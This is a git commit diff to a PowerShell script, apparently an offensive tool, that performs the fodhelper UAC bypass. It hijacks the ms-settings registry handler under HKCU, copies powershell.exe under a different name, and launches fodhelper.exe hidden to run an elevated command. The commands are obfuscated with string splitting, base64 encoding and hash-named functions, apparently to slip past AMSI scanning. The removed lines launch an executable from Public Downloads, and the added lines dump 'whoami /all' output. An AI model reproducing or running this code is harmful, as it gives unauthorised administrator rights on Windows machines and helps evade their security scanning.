aed6244ced9b82e5259d168d265dc1d4c0130fc8
p4yl0ad <57832389+p4yl0ad@users.noreply.github.com>
2021-04-06 15:33:07 +0100

    Update foddywoddy_AMSI.ps1

--- UAC/foddywoddy_AMSI.ps1
+++ UAC/foddywoddy_AMSI.ps1
@@ -1,10 +1,15 @@
-$cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("c"+"m"+"d"+" "+"/"+"c"+" "+"C"+":"+"\"+"U"+"s"+"e"+"r"+"s"+"\"+"P"+"u"+"b"+"l"+"i"+"c"+"\"+"D"+"o"+"w"+"n"+"l"+"o"+"a"+"d"+"s"+"\"+"f"+"o"+"d"+"S"+"M"+"B"+"p"+"o"+"o"+"n"+"."+"e"+"x"+"e"))
-copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
-Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
-New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
-
-Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-Start-Sleep -s 3
-Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+function b1946ac92492d2347c6235b4d2611184 {
+    $cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("cm"+"d"+"."+"e"+"x"+"e"+" "+"/"+"c"+" "+"wh"+"oa"+"mi"+" "+"/"+"a"+"l"+"l"+" "+">"+" "+"C:"+"\u"+"a"+"c"+".t"+"xt"))
+    copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
+    c4ff45bb1fab99f9164b7fec14b2292a
+}
+function c4ff45bb1fab99f9164b7fec14b2292a {
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    Start-Sleep -s 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+}
+b1946ac92492d2347c6235b4d2611184
